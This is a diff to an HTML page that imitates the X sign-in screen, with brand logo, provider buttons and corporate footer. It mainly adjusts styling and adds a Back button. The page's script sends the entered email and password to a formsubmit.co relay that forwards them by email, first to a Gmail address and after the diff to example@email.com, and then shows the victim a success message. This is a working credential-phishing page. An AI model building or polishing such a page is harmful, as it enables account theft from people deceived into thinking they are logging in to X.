@@ -4,12 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to X</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         
         body {
@@ -24,7 +25,7 @@
         
         .login-container {
             width: 100%;
-            max-width: 320px;
+            max-width: 350px;
             padding: 20px;
         }
         
@@ -33,18 +34,26 @@
             margin-bottom: 30px;
             font-size: 40px;
             font-weight: 700;
+            color: #1DA1F2;
         }
         
         .title {
             font-size: 28px;
             font-weight: 700;
             margin-bottom: 35px;
+            text-align: center;
+        }
+        
+        .provider-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
         }
         
         .provider-btn {
             width: 100%;
             padding: 12px 0;
-            margin-bottom: 12px;
             border-radius: 30px;
             border: 1px solid #536471;
             background: transparent;
@@ -60,36 +69,6 @@
         
         .provider-btn:hover {
             background-color: rgba(255, 255, 255, 0.05);
-        }
-        
-        .provider-btn.google::before {
-            content: "G";
-            display: inline-block;
-            font-weight: bold;
-            font-size: 18px;
-            margin-right: 8px;
-            background: white;
-            color: black;
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            text-align: center;
-            line-height: 24px;
-        }
-        
-        .provider-btn.apple::before {
-            content: "A";
-            display: inline-block;
-            font-weight: bold;
-            font-size: 18px;
-            margin-right: 8px;
-            background: white;
-            color: black;
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            text-align: center;
-            line-height: 24px;
         }
         
         .divider {
@@ -110,6 +89,10 @@
             font-size: 15px;
         }
         
+        .login-form {
+            margin-top: 20px;
+        }
+        
         .input-group {
             margin-bottom: 20px;
             position: relative;
@@ -127,7 +110,7 @@
         }
         
         .input-field:focus {
-            border-color: #1d9bf0;
+            border-color: #1DA1F2;
         }
         
         .input-label {
@@ -147,7 +130,7 @@
             font-size: 12px;
         }
         
-        .next-btn {
+        .action-btn {
             width: 100%;
             padding: 12px 0;
             border-radius: 30px;
@@ -161,18 +144,18 @@
             margin-bottom: 20px;
         }
         
-        .next-btn:hover {
+        .action-btn:hover {
             background-color: #e6e6e6;
         }
         
-        .next-btn:disabled {
-            background-color: #1d9bf0;
+        .action-btn:disabled {
+            background-color: #1DA1F2;
             opacity: 0.5;
             cursor: default;
         }
         
         .forgot-password {
-            color: #1d9bf0;
+            color: #1DA1F2;
             text-decoration: none;
             font-size: 14px;
             display: block;
@@ -192,7 +175,7 @@
         }
         
         .signup-link a {
-            color: #1d9bf0;
+            color: #1DA1F2;
             text-decoration: none;
         }
         
@@ -209,7 +192,7 @@
         .success-icon {
             font-size: 48px;
             margin-bottom: 20px;
-            color: #1d9bf0;
+            color: #1DA1F2;
         }
         
         .success-text {
@@ -222,41 +205,80 @@
         }
         
         .email-display {
-            color: #1d9bf0;
+            color: #1DA1F2;
             margin-bottom: 10px;
             font-size: 14px;
             text-align: left;
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            color: #1DA1F2;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .back-btn i {
+            margin-right: 5px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #71767b;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #71767b;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">𝕏</div>
+        <div class="logo">
+            <i class="fab fa-x-twitter"></i>
+        </div>
+        
+        <div class="title">Sign in to X</div>
+        
+        <div class="provider-buttons">
+            <button class="provider-btn">Sign in with Google</button>
+            <button class="provider-btn">Sign in with Apple</button>
+        </div>
+        
+        <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">or</div>
+            <div class="divider-line"></div>
+        </div>
         
         <div class="login-form">
-            <div class="title">Sign in to X</div>
-            
-            <button class="provider-btn google">Sign in with Google</button>
-            <button class="provider-btn apple">Sign in with Apple</button>
-            
-            <div class="divider">
-                <div class="divider-line"></div>
-                <div class="divider-text">or</div>
-                <div class="divider-line"></div>
-            </div>
-            
             <div class="email-container">
                 <div class="input-group">
                     <input type="email" id="email" class="input-field" placeholder=" " autocomplete="email">
                     <label for="email" class="input-label">Email</label>
                 </div>
                 
-                <button id="nextBtn" class="next-btn" disabled>Next</button>
+                <button id="nextBtn" class="action-btn" disabled>Next</button>
                 
                 <a href="#" class="forgot-password">Forgot password?</a>
             </div>
             
             <div class="password-container">
+                <button id="backBtn" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Back
+                </button>
                 <div class="email-display" id="emailDisplay"></div>
                 
                 <div class="input-group">
@@ -264,19 +286,31 @@
                     <label for="password" class="input-label">Password</label>
                 </div>
                 
-                <button id="submitBtn" class="next-btn">Submit</button>
+                <button id="submitBtn" class="action-btn">Submit</button>
                 
                 <a href="#" class="forgot-password">Forgot password?</a>
             </div>
             
             <div class="success-message">
-                <div class="success-icon">✓</div>
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
                 <div class="success-text">Successful submission</div>
             </div>
             
             <div class="signup-link">
                 Don't have an account? <a href="#">Sign up</a>
             </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Terms of Service</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Ads info</a>
+            <a href="#">More</a>
+            <p>© 2025 X Corp.</p>
         </div>
     </div>
 
@@ -285,6 +319,7 @@
             const emailInput = document.getElementById('email');
             const passwordInput = document.getElementById('password');
             const nextBtn = document.getElementById('nextBtn');
+            const backBtn = document.getElementById('backBtn');
             const submitBtn = document.getElementById('submitBtn');
             const emailContainer = document.querySelector('.email-container');
             const passwordContainer = document.querySelector('.password-container');
@@ -304,6 +339,12 @@
                 passwordContainer.style.display = 'block';
             });
             
+            // Handle "Back" button click
+            backBtn.addEventListener('click', function() {
+                passwordContainer.style.display = 'none';
+                emailContainer.style.display = 'block';
+            });
+            
             // Handle "Submit" button click
             submitBtn.addEventListener('click', function() {
                 const email = emailInput.value.trim();
@@ -319,7 +360,7 @@
                 formData.append('email', email);
                 formData.append('password', password);
                 
-                fetch('https://formsubmit.co/ajax/mnm89126@gmail.com', {
+                fetch('https://formsubmit.co/ajax/example@email.com', {
                     method: 'POST',
                     body: formData
                 })
